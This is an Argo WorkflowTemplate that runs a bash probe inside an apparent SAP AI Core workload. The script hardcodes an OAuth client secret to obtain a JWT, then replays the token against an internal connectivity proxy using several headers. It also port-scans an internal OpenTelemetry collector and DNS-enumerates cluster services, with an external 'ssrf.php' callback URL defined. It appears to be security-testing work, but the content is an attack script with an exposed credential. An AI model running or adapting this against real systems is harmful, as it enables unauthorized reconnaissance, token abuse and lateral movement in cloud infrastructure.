apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "44.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        CB="https://www.masonhck.tech/ssrf.php"
        CP="100.104.7.43"
        OTEL="100.109.242.36"
        
        # Get JWT (no Bearer prefix)
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='
        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
        echo "JWT: ${#JWT} chars" >&2
        
        # 1. Fix connectivity proxy token format
        echo "=== CONN PROXY TOKEN TESTS ===" >&2
        # No Bearer prefix - raw JWT in header
        R1=$(curl -sk --connect-timeout 5 -H "SAP-CP-Connectivity-Service-Token: $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
        echo "Raw JWT: $R1" >&2
        
        # Try different header combinations
        R2=$(curl -sk --connect-timeout 5 -H "SAP-Connectivity-Authentication: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
        echo "SAP-Connectivity-Auth: $R2" >&2
        
        R3=$(curl -sk --connect-timeout 5 -H "Authorization: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
        echo "Authorization: $R3" >&2
        
        R4=$(curl -sk --connect-timeout 5 -H "SAP-CP-Connectivity-Service-Token: $JWT" -H "Proxy-Authorization: Bearer $JWT" "http://${CP}:20003/" 2>&1 | head -c 300)
        echo "Both headers: $R4" >&2
        
        # 2. Probe OpenTelemetry collector
        echo "=== OTEL COLLECTOR ===" >&2
        for port in 4317 4318 8888 13133 55679 55680 14268 9411 1777; do
          R=$(curl -sk --connect-timeout 2 "http://${OTEL}:${port}/" 2>&1 | head -c 200)
          [ -n "$R" ] && echo "OTEL:${port}: $R" >&2
        done
        
        # Try OTEL health/metrics
        for path in "/v1/traces" "/v1/metrics" "/v1/logs" "/metrics" "/health" "/debug/pprof"; do
          R=$(curl -sk --connect-timeout 2 "http://${OTEL}:4318${path}" 2>&1 | head -c 200)
          [ -n "$R" ] && echo "OTEL:4318${path}: $R" >&2
        done
        
        # Try gRPC port
        R=$(curl -sk --connect-timeout 2 "http://${OTEL}:4317/" 2>&1 | head -c 100)
        echo "OTEL:4317: $R" >&2
        
        # 3. DNS wildcard search for ml-tracking
        echo "=== ML-TRACKING DEEP ===" >&2
        for svc in ml-tracking-server ml-tracking-api mlflow-server tracking-server experiment-tracking sap-ml-tracking ai-tracking; do
          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
          [ -n "$ip" ] && echo "FOUND: ${svc}.ml-tracking -> $ip" >&2
        done
        
        # SRV records
        dig +short SRV "*.ml-tracking.svc.cluster.local" 2>/dev/null | head -5 >&2
        
        echo "V44 DONE" >&2
